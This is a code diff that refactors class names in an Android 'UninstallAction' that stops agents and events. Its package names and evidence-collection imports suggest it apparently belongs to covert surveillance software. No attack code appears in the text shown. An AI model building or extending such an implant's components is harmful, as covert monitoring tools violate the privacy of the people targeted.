@@ -16,8 +16,9 @@ import android.net.Uri;
 
 import com.android.service.Messages;
 import com.android.service.Status;
-import com.android.service.agent.AgentManager;
+import com.android.service.agent.ManagerAgent;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.event.EventManager;
 import com.android.service.evidence.EvidenceCollector;
 import com.android.service.evidence.Markup;
@@ -26,7 +27,7 @@ import com.android.service.util.Check;
 /**
  * The Class UninstallAction.
  */
-public class UninstallAction extends SubAction {
+public class UninstallAction extends SubActionSlow {
 
 	private static final String TAG = "UninstallAction"; //$NON-NLS-1$
 
@@ -36,7 +37,7 @@ public class UninstallAction extends SubAction {
 	 * @param params
 	 *            the conf params
 	 */
-	public UninstallAction(final ActionConf params) {
+	public UninstallAction(final ConfAction params) {
 		super(params);
 	}
 
@@ -79,7 +80,7 @@ public class UninstallAction extends SubAction {
 			Check.log( TAG + " (stopServices)") ;//$NON-NLS-1$
 		}
 		
-		AgentManager.self().stopAll();
+		ManagerAgent.self().stopAll();
 		EventManager.self().stopAll();
 		Status.self().unTriggerAll();
 		return true;
@@ -123,7 +124,7 @@ public class UninstallAction extends SubAction {
 	}
 
 	@Override
-	protected boolean parse(ActionConf params) {
+	protected boolean parse(ConfAction params) {
 		return true;
 	}
 
